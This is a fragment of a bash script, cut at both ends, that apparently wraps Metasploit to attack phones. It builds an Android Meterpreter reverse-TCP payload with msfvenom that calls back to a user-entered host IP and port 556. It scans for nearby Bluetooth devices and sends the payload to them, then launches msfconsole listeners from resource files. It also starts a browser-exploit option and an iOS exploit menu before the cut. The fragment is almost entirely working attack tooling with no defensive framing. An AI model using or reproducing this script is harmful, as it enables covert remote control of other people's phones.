  read i
   if [[ "$i" == 'y' || "$i" == 'yes'  ]]; 
      then 
      sudo ifconfig
      ip address
      echo "ip address: "
   fi
    if [[ "$i" == 'n' || "$i" == 'no' ]];
     then 
      echo "no need for them ip addresses "
      echo "ip address: "
    fi
  read ip
  echo $ip >>ipfile
  echo "app name:"
  read name 
    msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
    echo "do you want to send the payload via bluethooth? (y/n) "
    read bt
    if [[ "$bt" == 'y' || "$bt" == 'Y' ]];
     then 
     btscanner hci0 
     echo "enter the address"
     read btad
     bluetooth-sendto 
    fi
    msfconsole -r android.rc
fi


if [[ "$s" == 'browser' || "$s" == '1' ]];
 then
 msfconsole -r browser.rc
fi
fi
#60
if [[ "$f" == 'second' || "$f" == '2' || "$f" == 'ios' ]];
 then 
 echo --Ios Exploits--
